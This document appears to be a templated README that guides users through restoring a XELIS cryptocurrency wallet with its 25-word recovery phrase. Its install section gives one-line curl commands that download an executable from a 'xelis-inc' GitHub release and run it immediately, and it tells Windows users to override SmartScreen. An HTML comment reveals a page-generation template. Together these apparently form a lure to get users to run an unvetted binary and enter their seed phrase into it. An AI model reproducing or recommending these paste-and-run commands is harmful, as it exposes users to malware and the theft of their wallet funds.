![Restore a XELIS Wallet on a new computer](assets/banner-article.png)
# Restore a XELIS Wallet on a new computer

Install, choose restore, enter 25 words and confirm the balance.

## Downloads - Restore

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Install the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) on the new machine first. A restore runs inside the app, so the version you download decides which restore options exist and how the phrase is validated.

> Restoring does not move funds. It recreates the same keys on another machine, so both copies control one wallet.

To restore XELIS Wallet on a new computer, install the app, choose the restore or import option, enter the 25 words in order, then set a new local password. The wallet recreates the same address and shows the balance and history once it has synced with a node. Expect a short wait: a fresh install has no transaction history until it catches up.

<!-- ARTICLE-BODY-BEGIN -->
## What a restore can and cannot do

A restore rebuilds the keys from the phrase, which is why the address comes back identical and the funds come with it. It cannot recover a phrase you no longer have, reverse a transaction, or decrypt a wallet file whose password is lost. Those limits come from the design, not from a missing feature.

There is also a difference between missing history and a wrong balance. History can be incomplete on a node that does not keep the full chain, while the current balance should still be right once sync finishes. If the balance itself looks wrong, work through the causes below before concluding anything is lost.

## Restore XELIS Wallet step by step

1. Install the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> on the new machine.
2. Open the app and choose the option to restore or import an existing wallet.
3. Enter the 25 words in the order you recorded them.
4. Set a new local password for this machine.
5. Let the wallet sync; the balance and history appear as the chain is read.
6. Compare the address with the old wallet to confirm the restore is the same wallet.

Comparing addresses is the check that matters. If the address matches, the phrase is correct regardless of how long the sync takes. If it does not match, stop: a single wrong word produces a valid but different wallet, and no amount of waiting fixes that.

## When the balance looks wrong afterwards

| What you see | Likely cause | What to do |
| --- | --- | --- |
| Zero balance immediately after restore | Sync has not finished | Wait, then check the node connection |
| Same address, older history only | The node prunes old blocks | Use a node that keeps full history |
| Different address than before | A word is wrong, or the phrase belongs to another wallet | Re-enter the phrase from your written copy |
| Two wallets with the same phrase behave differently | One install is syncing to a different height | Compare node and sync state on both |

The address mismatch case is the one worth slowing down for. A restored phrase always derives one address; if that address is not the one you funded, the phrase is not the phrase you think it is. The full sequence for a balance that stays empty is in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-balance-missing-restore.md">fix a missing XELIS Wallet balance</a>.

## If the old machine still works

Do not wipe the old install until the new one shows the right address and balance. Keeping both for a day costs nothing and gives you a reference point: the old wallet shows what the balance should be, and the new one shows whether it has caught up. Running two copies is covered in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-second-computer-multiple-wallets.md">use XELIS Wallet on two computers</a>.

Once the new machine is confirmed, remove the wallet from the old one or at least delete its local data, so a sold or repaired laptop does not carry a working wallet.

## Recovering without the phrase

There is no recovery path without the 25 words. The wallet has no account recovery, no support override and no reset that preserves funds, because nobody else holds a copy of the keys. If the phrase is incomplete, the wallet it restores is a different, empty wallet.

That is why the phrase is checked before funds arrive, as described in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">back up the XELIS Wallet phrase</a>.

## FAQ

### Can I recover a XELIS Wallet without the recovery phrase?

No. Without the 25 words there is no way to rebuild the keys, here or anywhere else, and no recovery service can substitute for them.

### What happens if I lose the phrase?

The wallet on this machine keeps working while it exists, but no new machine can be restored. Losing the phrase and losing the machine together means losing access.

### What happens if you lose your 12-word recovery phrase?

XELIS uses 25 words, not 12, so a 12-word phrase belongs to a different product. Within XELIS, losing the phrase has the same outcome at any length: no restore.

### How do I recover my wallet account?

There is no account, only keys. Install the app, restore from the phrase, and the address returns.

### What if my old wallet used a different derivation path or account index?

XELIS derives one address from a phrase, so a restore reproduces that address rather than offering a choice of paths. If the address differs, the phrase differs.

### Do you have your seed phrase saved?

That is the first question to answer before any restore. If the answer is no, stop and secure the working copy first.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Fix a missing XELIS Wallet balance](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-balance-missing-restore.md)
- [Use XELIS Wallet on two computers](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-second-computer-multiple-wallets.md)
- [Back up the XELIS Wallet phrase](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [Store a XELIS Wallet seed phrase safely](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
